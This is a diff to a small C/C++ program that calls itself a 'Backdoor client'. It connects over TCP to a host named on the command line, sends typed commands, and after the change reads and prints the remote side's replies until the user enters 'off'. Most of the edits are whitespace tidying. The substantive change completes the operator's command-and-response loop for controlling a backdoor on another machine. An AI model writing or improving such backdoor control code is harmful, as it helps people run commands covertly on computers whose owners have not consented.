@@ -2,7 +2,7 @@
 
 
 int main(int argc, char* argv[])
-{ 
+{
 	cout << "Welcome to the cool Backdoor client...\n";
 	int sockfd, n;
 	struct sockaddr_in serv_addr;
@@ -18,12 +18,12 @@ int main(int argc, char* argv[])
 
 	//create the socket
 	//args: inet domain, stream sock, default protocol (tcp here)
-	sockfd = socket(PF_INET, SOCK_STREAM, 0);
+	sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
 	if (sockfd < 0 ){
 		printf("Oh No!!!!!\n");
 	}
-	
+
 	server = gethostbyname(argv[1]);
 	if(server == NULL){
 		fprintf(stderr, "ERROR, no such host\n");
@@ -39,21 +39,27 @@ int main(int argc, char* argv[])
 		fprintf(stderr, "ERROR connecting\n");
 	}
 
-	n=read(sockfd, buffer, 1023);
+	n = read(sockfd, buffer, 1023);
 	printf("%s\n", buffer);
 
 	menu(); // print the menu to start
-	
+
 	printf("Enter command: ");
 	amountRead = getline(&buffer, &bufferSize, stdin);
-	
+
 	while (strncmp("off", buffer, (int)strlen(buffer)-1) != 0){
         write(sockfd, buffer, amountRead);
-		amountRead = getline(&buffer, &bufferSize, stdin);
+				memset(buffer, 0, 1024);
+				n = read(sockfd, buffer, 1023);
+				printf("%s\n", buffer);
+				printf("Enter command: ");
+				memset(buffer, 0, 1024);
+				amountRead = getline(&buffer, &bufferSize, stdin);
+
 	}
-	
+
 	write(sockfd, buffer, amountRead);
-	
+
 }
 
 void menu()
@@ -80,5 +86,5 @@ void menu()
 	printf("help							- print this list of commands\n");
 	printf("off							- terminate the backdoor program\n");
 	printf("-----------------------------------------------\n\n");
-	
+
 }
